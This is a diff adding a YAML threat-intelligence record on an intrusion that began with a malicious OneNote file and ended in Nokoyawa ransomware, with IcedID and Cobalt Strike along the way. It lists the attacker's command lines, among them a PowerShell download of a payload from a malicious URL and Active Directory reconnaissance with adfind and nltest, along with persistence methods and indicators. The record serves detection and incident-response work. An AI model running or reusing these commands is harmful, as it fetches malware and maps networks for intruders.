@@ -1,0 +1,88 @@
+summary: A threat actor deployed the Nokoyawa ransomware following an initial access
+  through a malicious OneNote file. The attack involved various techniques including
+  PowerShell, Cobalt Strike beacons, AnyDesk installation, and lateral movement via
+  RDP.
+date: '2024-07-26'
+authors:
+- '@iiamaleks'
+- '@IrishD34TH'
+- REDACTED
+- '@Miixxedup'
+attribution: Unknown
+malware_families:
+- IcedID
+- Cobalt Strike
+- Nokoyawa
+TTPs:
+  processs:
+  - OneNote.exe
+  - cmd.exe
+  - powershell.exe
+  - rundll32.exe
+  - svchost.exe
+  - regsvr32.exe
+  - wmic.exe
+  - ipconfig.exe
+  - systeminfo.exe
+  - net.exe
+  - nltest.exe
+  - adfind.exe
+  - nslookup.exe
+  - InternetExplorer.exe
+  - FileZilla.exe
+  - Taskmgr.exe
+  - SoftPerfectNetworkScanner.exe
+  - ProcessHacker.exe
+  commandline:
+  - C:\\Windows\\system32\\cmd.exe /c powershell invoke-webrequest -uri http://mrassociattes.com/images/62.gif
+    -outfile c:\\programdata\\COIm.jpg
+  - rundll32.exe "C:\\Users\\[REDACTED]\\AppData\\Roaming\\[REDACTED]\\Cadiak.dll",init --od="DeskBlouse\\license.dat"
+  - WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List
+  - ipconfig /all
+  - systeminfo
+  - net config workstation
+  - nltest /domain_trusts
+  - nltest /domain_trusts /all_trusts
+  - net view /all /domain
+  - net group "Domain Admins" /domain
+  - C:\\Windows\\system32\\cmd.exe /c dir /s /b C:\\Windows\\system32\\*htable.xsl
+  - adfind.exe -gcb -sc trustdmp
+  - adfind.exe -f "(objectcategory=group)"
+  - adfind.exe -subnets -f (objectCategory=subnet)
+  - adfind.exe -f (objectcategory=organizationalUnit)
+  - adfind.exe -f objectcategory=computer -csv name operatingSystem
+  - adfind.exe -f objectcategory=computer
+  - adfind.exe -f (objectcategory=person)
+  - C:\\Windows\\system32\\cmd.exe /c nslookup [REDACTED]
+  - C:\\Windows\\system32\\cmd.exe /c nslookup [REDACTED]
+  powershell:
+  - invoke-webrequest -uri http://mrassociattes.com/images/62.gif -outfile c:\\programdata\\COIm.jpg
+  registry_keys:
+  - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+  network_connections:
+  - protocol: HTTP
+    port: 80
+    destination: 193.149.129.131
+  file_modifications:
+  - C:\\Users\\[REDACTED]\\AppData\\Roaming\\[REDACTED]\\Cadiak.dll
+  - C:\\Users\\[REDACTED]\\AppData\\Roaming\\[REDACTED]\\license.dat
+  persistence:
+  - Scheduled Task: Created to execute IcedID DLL at logon.
+  - Service: AnyDesk installed as a Windows service, configured to start with Windows.
+  pipes:
+  - \\postex_*\0
+  - \\postex_ssh_*\0
+  - \\status_*\0
+  - \\msagent_*\0
+  - \\MSSE-*\0
+  - \\*-server\0
+  process_relations:
+  - OneNote.exe -> cmd.exe -> powershell.exe -> rundll32.exe (IcedID DLL)
+  - Cobalt Strike Beacon injected into svchost.exe
+IOCs:
+- hash: Unknown
+- ip: 91.215.85[.]183
+- domain: aerilaponawki[.]com
+- url: http://mrassociattes.com/images/62.gif
+reference: https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/
+file_creation_date: May 11, 2025
